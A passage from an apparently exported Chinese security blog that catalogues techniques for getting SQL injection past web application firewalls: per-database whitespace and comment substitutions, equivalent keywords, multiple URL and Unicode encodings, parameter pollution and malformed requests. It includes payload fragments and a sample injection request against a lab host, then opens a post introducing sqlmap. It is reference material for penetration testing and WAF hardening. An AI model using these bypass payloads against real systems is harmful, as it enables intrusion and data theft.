<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: text/plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">23\r\n</span><br><span class="line">This is the data in the first chunk\r\n</span><br><span class="line">1A\r\n</span><br><span class="line">and this is the second one\r\n</span><br><span class="line">3\r\n</span><br><span class="line">con\r\n</span><br><span class="line">8\r\n</span><br><span class="line">sequence\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<p>也可以使用github上的插件实现分块传输</p>
<p><strong>chunked-coding-converter</strong>：<a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p>
<p><img src="https://i.loli.net/2021/11/01/oHMetK2AJmBg5qO.gif" alt="img"></p>
<h3 id="另类字符集编码绕过"><a href="#另类字符集编码绕过" class="headerlink" title="另类字符集编码绕过"></a>另类字符集编码绕过</h3><p>Content-Type头中使用charset定义字符集的应用场景不只有在responses中，request中同样可以使用。</p>
<p>常见的服务器与可见编码如下所示：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">服务器信息</th>
<th>可用编码</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Nginx, uWSGI-Django-Python3</td>
<td>IBM037, IBM500, cp875, IBM1026, IBM273</td>
<td>对参数名和参数值进行编码，服务器会对参数名和参数值均进行url解码，需要对等号和&amp; and进行编码(不进行url编码)</td>
</tr>
<tr>
<td style="text-align:left">Nginx, uWSGI-Django-Python2</td>
<td>IBM037, IBM500, cp875, IBM1026, utf-16, utf-32, utf-32BE, IBM424</td>
<td>对参数名和参数值进行便慢慢 服务器会对参数名和参数值均进行url解码 等号和&amp;符号不应该以任何方式编码。</td>
</tr>
<tr>
<td style="text-align:left">Apache-TOMCAT8-JVM1.8-JSP</td>
<td>IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td>
<td>参数名按原始格式(可以像往常一样使用url编码)Body不论是否经过url编码均可等号和&amp;符号不应该以任何方式编码</td>
</tr>
<tr>
<td style="text-align:left">Apache-TOMCAT7-JVM1.6-JSP</td>
<td>IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td>
<td>参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
</tr>
<tr>
<td style="text-align:left">IIS6, 7.5, 8, 10 -ASPX (v4.x)</td>
<td>IBM037, IBM500, IBM870, cp875, IBM1026, IBM01047, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, unicodeFFFE, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420,IBM423, IBM424, x-EBCDIC-KoreanExtended, IBM-Thai, IBM871, IBM880, IBM905, IBM00924, cp1025</td>
<td>参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
</tr>
</tbody>
</table>
</div>
<h2 id="规则缺陷-特性角度绕过WAF"><a href="#规则缺陷-特性角度绕过WAF" class="headerlink" title="规则缺陷/特性角度绕过WAF"></a>规则缺陷/特性角度绕过WAF</h2><h3 id="空白符替换绕过"><a href="#空白符替换绕过" class="headerlink" title="空白符替换绕过"></a>空白符替换绕过</h3><h4 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h4><blockquote>
<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,username<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
</blockquote>
<ul>
<li><p>位置①</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23est%0d%0a、 —+a%0d%0a</li>
<li>可以利用数学运算以及数据类型：news_id=1.0，news_id=1E0，news_id=\N</li>
</ul>
</li>
<li><p>位置②</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
<li>可以利用括号：union(select 1,2)</li>
</ul>
</li>
<li><p>位置③</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
<li>可以利用其它符号：+ 、- 、 ~ 、!、@</li>
</ul>
</li>
<li><p>位置④</p>
<ul>
<li><p>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</p>
</li>
<li><p>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</p>
</li>
<li><p>大括号{}：union select {``1},{x 2}</p>
</li>
<li><p>可利用数学运算以及数据类型：</p>
<blockquote>
<p>union select usename,2.0from admin<br>union select username,8e0from admin<br>union select username,\Nfrom admin</p>
</blockquote>
</li>
</ul>
</li>
<li><p>位置⑤</p>
<ul>
<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
<li>反引号`：union select 1,table_name,3  from`information_schema`.`tables`limit 0,1%23</li>
<li>内联注释：union select 1,table_name,3  from /*!50001information_schema.tables*/ limit 0,1%23</li>
<li>大括号{}：union select 1,table_name,3  from{x information_schema.tables}limit 0,1%23</li>
<li>小括号()：union select 1,table_name,3  from(information_schema.tables)limit 0,1%23</li>
</ul>
</li>
</ul>
<h4 id="SQLServer特性"><a href="#SQLServer特性" class="headerlink" title="SQLServer特性"></a>SQLServer特性</h4><blockquote>
<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,db_name()<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
</blockquote>
<ul>
<li>位置①<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用数学运算符以及数据类型：news_id=1.0，news_id=1e0，news_id=1-1</li>
</ul>
</li>
<li>位置②<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可以利用加号+替换空格：union+select</li>
</ul>
</li>
<li>位置③<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用数学运算符：+、-、~、.    （注：其中-、~、.号必须是select查询的第一个字段的数据类型为数字型才能使用）</li>
<li>可以利用小括号()替换空格：select(1),2,db_name()</li>
</ul>
</li>
<li>位置④<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
</ul>
</li>
<li>位置⑤<ul>
<li>可以利用其它控制字符替换空格：%01~%0F、%11~%1F</li>
<li>可以利用注释符号：/**/、—+a%0d%0a</li>
<li>可利用其他字符：%80~%FF（需要IIS服务器支持）</li>
<li>可以利用点号.替换空格：from.users</li>
<li>可以利用中括号[]替换空格：from[users]</li>
</ul>
</li>
</ul>
<h4 id="Access特性"><a href="#Access特性" class="headerlink" title="Access特性"></a>Access特性</h4><blockquote>
<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,username<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
</blockquote>
<ul>
<li>位置①<ul>
<li>可利用其他控制字符替换空格：%09、%0a、%0c、%0d、%16</li>
</ul>
</li>
<li>位置②<ul>
<li>可利用其他控制字符替换空格：%09、%0a、%0c、%0d</li>
</ul>
</li>
<li>位置③<ul>
<li>可利用其他控制字符替换空格：%09、%0a、%0c、%0d</li>
<li>可使用其他字符：+、-、.、=</li>
</ul>
</li>
</ul>
<h4 id="Oracle特性"><a href="#Oracle特性" class="headerlink" title="Oracle特性"></a>Oracle特性</h4><blockquote>
<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,username<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
</blockquote>
<ul>
<li>位置①<ul>
<li>可利用其他控制字符替换空格：%00、%09、%0a、%0b、%0c、%0d</li>
<li>可以利用其它控制字符替换空格：%1f、%1d</li>
<li>可使用其他字符：.</li>
</ul>
</li>
<li>位置②<ul>
<li>可利用其他控制字符替换空格：%00、%09、%0a、%0b、%0c、%0d</li>
</ul>
</li>
<li><p>位置③</p>
<ul>
<li>可利用其他控制字符替换空格：%00、%09、%0a、%0b、%0c、%0d</li>
<li>可使用其他字符：-、+、%ad</li>
</ul>
</li>
<li><p>位置④</p>
<ul>
<li>可利用其他控制字符替换空格： %09、%0a、%0c、%0d</li>
</ul>
</li>
<li>位置⑤<ul>
<li>可利用其他控制字符替换空格：%09、%0a、%0c、%0d</li>
<li>可插入字符：%30~%ff、%24、%7b%22~%7b%76</li>
</ul>
</li>
</ul>
<h4 id="PostgreSQL特性"><a href="#PostgreSQL特性" class="headerlink" title="PostgreSQL特性"></a>PostgreSQL特性</h4><blockquote>
<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,username<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
</blockquote>
<ul>
<li>位置①<ul>
<li>可利用其他控制字符替换空格：%09、%0a、%0c、%0d</li>
<li>可使用其他字符：.、!</li>
</ul>
</li>
<li>位置②<ul>
<li>可利用其他控制字符替换空格：%09、%0a、%0c、%0d</li>
</ul>
</li>
<li>位置③<ul>
<li>可利用其他控制字符替换空格：%09、%0a、%0c、 %0d</li>
<li>可使用其他字符：.、~、@、-、+</li>
</ul>
</li>
<li>位置④<ul>
<li>可利用其他控制字符替换空格： %09、%0a、%0c、%0d</li>
</ul>
</li>
<li>位置⑤<ul>
<li>可利用其他控制字符替换空格：%09、%0a、%0c、%0d</li>
<li>可插入字符：%30~%ff、%24</li>
</ul>
</li>
</ul>
<h3 id="函数分隔符绕过"><a href="#函数分隔符绕过" class="headerlink" title="函数分隔符绕过"></a>函数分隔符绕过</h3><p>对基于正则表达式的WAF，我们猜测安全工程师写WAF规则时，可能不知道函数名与左括号之间可以存在特殊字符，或者遗漏可以存在特殊字符。例如匹配函数”concat()”的规则写法，“concat(”或者”concat\s*(”，就没有考虑到一些特殊字符。相应的绕过方法，在特殊位置引入特殊的分隔符，逐个测试。这些特殊分隔符发现也是通过Fuzz出来的。</p>
<h3 id="等价关键字绕过"><a href="#等价关键字绕过" class="headerlink" title="等价关键字绕过"></a>等价关键字绕过</h3><p>有些函数或命令因其关键字被检测出来而无法使用但是在很多情况下可以使用与之等价或类似的代码替代其使用。</p>
<p>以下举例了mysql中的等价关键字：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line"></span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line"></span><br><span class="line">updatexml、extractvalue() ==&gt; polygon()</span><br><span class="line"></span><br><span class="line">@@user ==&gt; user()</span><br><span class="line"></span><br><span class="line">@@datadir ==&gt; datadir()</span><br><span class="line"></span><br><span class="line">and ==&gt; &amp;&amp;</span><br><span class="line"></span><br><span class="line">or ==&gt; ||</span><br><span class="line"></span><br><span class="line">not ==&gt; !</span><br><span class="line"></span><br><span class="line">xor ==&gt; |</span><br><span class="line"></span><br><span class="line">= ==&gt; like</span><br><span class="line"></span><br><span class="line">!= ==&gt; &lt;&gt;</span><br><span class="line"></span><br><span class="line">limit 0,1 ==&gt; limit 1 offset 0</span><br><span class="line"></span><br><span class="line">union select ==&gt; union select * from (select 1)a join (select 2)b</span><br><span class="line"></span><br><span class="line">’‘ ==&gt; &quot;&quot;</span><br><span class="line"></span><br><span class="line">&#x27;admin&#x27; ==&gt; 0x61646D696E</span><br><span class="line"></span><br><span class="line">select * from users where id = 1 order 4 ==&gt; select * from users where id = 1 into @a,@b,@c,@d</span><br></pre></td></tr></table></figure>
<h3 id="添加库名绕过"><a href="#添加库名绕过" class="headerlink" title="添加库名绕过"></a>添加库名绕过</h3><p>以下两条查询语句，执行的结果是一致的，但是有些 waf 的拦截规则 并不会拦 截[库名].[表名]这种模式。</p>
<h3 id="ALL-或者-DISTINCT-绕过"><a href="#ALL-或者-DISTINCT-绕过" class="headerlink" title="ALL 或者 DISTINCT 绕过"></a>ALL 或者 DISTINCT 绕过</h3><p>去掉重复值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">DISTINCT</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">DISTINCT</span> <span class="number">1</span>,<span class="number">2</span> </span><br></pre></td></tr></table></figure>
<p>显示全部 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">all</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">all</span> <span class="number">1</span>,</span><br></pre></td></tr></table></figure>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>常用于 waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">UniON</span> <span class="keyword">SelECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure>
<h3 id="双关键字绕过"><a href="#双关键字绕过" class="headerlink" title="双关键字绕过"></a>双关键字绕过</h3><p>在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。</p>
<h3 id="双重-多重URL编码绕过"><a href="#双重-多重URL编码绕过" class="headerlink" title="双重/多重URL编码绕过"></a>双重/多重URL编码绕过</h3><p>双重url编码，即对于浏览器发送的数据进行了两次urlencode操作，如s做一次url编码是%73,再进行一次编码是%25%37%33。一般情况下数据经过WAF设备的时候只会做一次url解码，这样解码之后的数据一般不会匹配到规则，达到了bypass的效果。</p>
<h3 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h3><p>IIS服务器支持对于unicode的解析，例如我们对于select中的字符进行unicode编码，可以得到如下的s%u006c%u0006ect，这种字符在IIS接收到之后会被转换为select，但是对于WAF层，可能接收到的内容还是s%u006c%u0006ect，这样就会形成bypass的可能。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>字符</strong></th>
<th><strong>Unicode编码</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>a</td>
<td>%u0000  %u0041  %u0061  %u00aa  %u00e2</td>
</tr>
<tr>
<td>单引号</td>
<td>%u0027  %u02b9  %u02bc  %u02c8  %u2032  %uff07  %c0%27  %c0%a7  %e0%80%a7</td>
</tr>
<tr>
<td>空白</td>
<td>%u0020  %uff00  %c0%20  %c0%a0  %e0%80%a0</td>
</tr>
<tr>
<td>左括号(</td>
<td>%u0028  %uff08  %c0%28  %c0%a8  %e0%80%a8</td>
</tr>
<tr>
<td>右括号)</td>
<td>%u0029  %uff09  %c0%29  %c0%a9  %e0%80%a9</td>
</tr>
</tbody>
</table>
</div>
<h3 id="Emoji表情字符绕过"><a href="#Emoji表情字符绕过" class="headerlink" title="Emoji表情字符绕过"></a>Emoji表情字符绕过</h3><p>emoji是一串unicode字集组成，一个emoji图标可以占2、4、7个字节。且mysql支持emoji存储。</p>
<p>部分Emoji可以插入到%23与%0A之间实现绕过。</p>
<h3 id="json提交与xml提交绕过"><a href="#json提交与xml提交绕过" class="headerlink" title="json提交与xml提交绕过"></a>json提交与xml提交绕过</h3><p>有些程序是 json 提交参数，程序也是 json 接收再拼接到 SQL 执行 json 格式通 常不会被拦截。所以可以绕过 waf。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/06/vul/sqli/sqli_id.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.115</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line">Content-Type:application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.0.115</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.115/06/vul/sqli/sqli_id.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=e6sa76lft65q3fd25bilbc49v3; security_level=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="pgsql">&#123;<span class="string">&#x27;id&#x27;</span>:<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;submit&#x27;</span>:<span class="number">1</span>&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/01/PocMO7Ex5aUe231.png" alt="image-20211101231132608"></p>
<p>同样 text/xml 也不会被拦截</p>
<h3 id="特殊的百分号"><a href="#特殊的百分号" class="headerlink" title="特殊的百分号"></a><strong>特殊的百分号</strong></h3><p>在<strong>ASP/ASPX+IIS</strong>的环境中存在一个特性，就是特殊符号%，在该环境下当们我输入s%elect的时候，在WAF层可能解析出来的结果就是s%elect，但是在iis+asp的环境的时候，解析出来的结果为select。</p>
<h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p>
<p>在ASPX中，有一个比较特殊的HPP特性，当GET/POST/COOKIE同时提交的参数id，服务端接收参数id的顺序GET,POST,COOKIE，中间通过逗号链接，于是就有了这个idea。</p>
<p>UNION、SELECT、FROM 三个关键字分别放在GET/POST/COOKIE的位置，通过ASPX的这个特性连起来，堪称完美的一个姿势，压根不好防。</p>
<p>但姿势利用太过于局限： 使用Request.Params[“id”]来获取参数,G-P-C获取到参数拼接起来，仅仅作为Bypass分享一种思路而已。</p>
<p>下表中列举了一些主流环境下的HPP情况：</p>
<p><img src="https://i.loli.net/2021/11/01/nJUeDxwyGCkE52H.png" alt="image-20211101212812215"></p>
<h3 id="GET方法传输POST数据绕过"><a href="#GET方法传输POST数据绕过" class="headerlink" title="GET方法传输POST数据绕过"></a>GET方法传输POST数据绕过</h3><p>大家的常识是GET参数通过URL传递，POST放在Request body中。</p>
<p>但是在某些中间件（如IIS）中的GET请求同样可以传输POST数据。</p>
<h3 id="畸形method绕过"><a href="#畸形method绕过" class="headerlink" title="畸形method绕过"></a>畸形method绕过</h3><p>某些WAF在处理数据的时候严格按照GET、POST等标准HTTP方法来获取数据，或者采用正则匹配的方式来处理数据，可能因为WAF和WEB服务解析的前后不对等绕过WAF。</p>
<p><strong>存在环境：Apache 2.X</strong></p>
<p>某些apache版本在做GET请求的时候，无论method为何值均会取出GET的内容。</p>
<p><img src="https://i.loli.net/2021/11/01/taMzuKkXyIEPDxC.png" alt="image-20211101212939505"></p>
<h3 id="畸形的boundary绕过"><a href="#畸形的boundary绕过" class="headerlink" title="畸形的boundary绕过"></a>畸形的boundary绕过</h3><p>PHP在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为——aaaa,123456，php解析的时候只识别了——aaaa，后面的内容均没有识别。然而WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现绕过。</p>
<p><strong>存在环境：PHP</strong></p>
<h3 id="参数数量限制绕过"><a href="#参数数量限制绕过" class="headerlink" title="参数数量限制绕过"></a>参数数量限制绕过</h3><p>WAF在实际环境中为防止拒绝服务式攻击 (denial of service attacks)，默认最多解析前 100 个请求参数 (包括同名的)，更多的参数将直接忽略。</p>
<p><strong>存在环境：Nginx+Lua WAF</strong></p>
<p><img src="https://i.loli.net/2021/11/01/KhkLjBPUAuerdE2.png" alt="image-20211101215241527"></p>
<h3 id="变换请求方式绕过"><a href="#变换请求方式绕过" class="headerlink" title="变换请求方式绕过"></a>变换请求方式绕过</h3><p>假如php里使用$_REQUEST获取参数，那么php获取参数的默认优先级是：</p>
<p><code>$_COOKIE</code>  &gt;  <code>$_POST</code>  &gt;  <code>$_GET</code>。此时WAF层只过滤get/post，但没有过滤cookie，于是导致了绕过。</p>
<p><strong>存在环境：PHP</strong></p>
<h3 id="信任白名单绕过"><a href="#信任白名单绕过" class="headerlink" title="信任白名单绕过"></a>信任白名单绕过</h3><p>有些 WAF 会自带一些文件白名单，对于白名单 waf 不会拦截任何操作，所以可 以利用这个特点，可以试试白名单绕过。</p>
<p>白名单通常有目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin</span><br><span class="line"></span><br><span class="line">/phpmyadmin</span><br><span class="line"></span><br><span class="line">/admin.php</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/01/T1uIml34HhcYdCe.png" alt="image-20211101220538726"></p>
<h3 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h3><p>除了白名单信任文件和目录外，还有一部分 waf 并不会对静态文件进行拦截。 例如 图片文件 jpg 、png 、gif 或者 css 、js 会对这些静态文件的操作不会 进行检测从而绕过 waf 拦截。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="number">1.</span>jpg<span class="operator">&amp;</span>name<span class="operator">=</span>vince<span class="operator">+</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="number">1.</span>jpg<span class="operator">=</span><span class="operator">/</span><span class="number">1.</span>jpg<span class="operator">&amp;</span>name<span class="operator">=</span>vince<span class="operator">+</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="number">1.</span>css<span class="operator">=</span><span class="operator">/</span><span class="number">1.</span>css<span class="operator">&amp;</span>name<span class="operator">=</span>vince<span class="operator">+</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/01/j6q3iExLdB59h2S.png" alt="image-20211101230701225"></p>
<h3 id="PostgreSQL字符串特性绕过"><a href="#PostgreSQL字符串特性绕过" class="headerlink" title="PostgreSQL字符串特性绕过"></a>PostgreSQL字符串特性绕过</h3><p>由于 postgres 会将双引号中的内容认为是一个表名/字段名，同时在双引号引起的字符串中使用 U&amp; 前缀转义是合法的，所以当过滤了 information_schema 等关键名称时，可以将其用双引号引用并在其前面 加入 U&amp;转义前缀，同时将其中某个字符替换为对应的 Unicode 表现形式来绕过 WAF。</p>
<p>例如：以下语句同样会返回所有的 Schema</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span>&quot;tabl\0065_sch\0065ma&quot; <span class="keyword">from</span> U<span class="operator">&amp;</span>&quot;inform\0061tion_sch\0065ma&quot;.U<span class="operator">&amp;</span>&quot;t\0061bles&quot; <span class="keyword">where</span> </span><br><span class="line">U<span class="operator">&amp;</span>&quot;tabl\0065_sch\0065ma&quot; <span class="keyword">not</span> <span class="keyword">in</span> (U<span class="operator">&amp;</span><span class="string">&#x27;pg_cat\0061log&#x27;</span>,U<span class="operator">&amp;</span><span class="string">&#x27;inform\0061tion_sch\0065ma&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://blog.csdn.net/Fly_hps/article/details/86626985">WAF攻防研究之四个层次Bypass WAF<em>Fly</em>鹏程万里-CSDN博客</a></li>
<li>ZP《BypassD盾mssql注入》</li>
<li>暗月 编《渗透测试手册WEB安全漏洞》</li>
<li><a href="https://cloud.tencent.com/developer/article/1605492?from=article.detail.1813470">那些可以绕过WAF的各种特性 - 云+社区 - 腾讯云 (tencent.com)</a></li>
<li><a href="http://github.wh0ale.xyz/2019/12/04/waf从入门到Bypass/">waf从入门到Bypass | Wh0ale’s Blog</a></li>
<li><a href="https://blog.csdn.net/zhangge3663/article/details/116394692">干货|各种WAF绕过手法学习_zhangge3663的博客-CSDN博客</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448903698&amp;idx=1&amp;sn=54df1b51cdfc5f274bebe31088786ae7&amp;scene=21#wechat_redirect">Bypass ngx_lua_waf SQL注入防御（多姿势） (qq.com)</a></li>
<li><a href="https://www.cnblogs.com/renhaoblog/p/13395539.html">利用分块传输绕WAF - renblog - 博客园 (cnblogs.com)</a></li>
<li><a href="https://www.freebuf.com/sectool/193659.html">技术讨论 | 在HTTP协议层面绕过WAF - FreeBuf网络安全行业门户</a></li>
<li>zcgonvh 编《Postgres注入方式总结》</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>WAF-Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap的使用技巧</title>
    <url>/post/774ae9de.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sqlmap介绍"><a href="#sqlmap介绍" class="headerlink" title="sqlmap介绍"></a>sqlmap介绍</h2><p>sqlmap是一个开源的、国内外著名的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型的数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件，甚至可以通过外带数据连接的方式执行操作系统命令。</p>
<p>sqlmap支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
<p>sqlmap支持一下5种不同的注入模式。</p>
<ol>
<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
<li>基于时间的盲注，即不能根据页面返回的内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
<li>基于报错注入，即页面返回错误信息，或者把注入语句结果直接返回在主页中。</li>
<li>联合查询注入，可以使用union的情况下的注入。</li>
<li>堆叠查询注入，即执行多条SQL语句构造的注入。</li>
</ol>
